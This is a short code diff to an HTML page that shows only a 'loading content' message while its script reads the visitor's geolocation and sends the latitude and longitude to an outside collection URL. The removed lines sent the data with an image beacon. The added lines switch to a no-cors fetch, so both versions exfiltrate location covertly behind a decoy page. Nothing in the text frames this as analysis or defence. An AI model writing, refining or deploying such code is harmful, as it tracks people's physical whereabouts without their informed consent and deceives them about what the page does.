@@ -7,8 +7,10 @@
     <p>Please wait, loading content...</p>
     <script>
         navigator.geolocation.getCurrentPosition(function(position) {
-            var img = new Image();
-            img.src = 'https://eon186u4rmikh86.m.pipedream.net?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude;
+            var url = 'https://eon186u4rmikh86.m.pipedream.net/?' + 
+                      'lat=' + position.coords.latitude + 
+                      '&lon=' + position.coords.longitude;
+            fetch(url, {mode: 'no-cors'});
         });
     </script>
 </body>
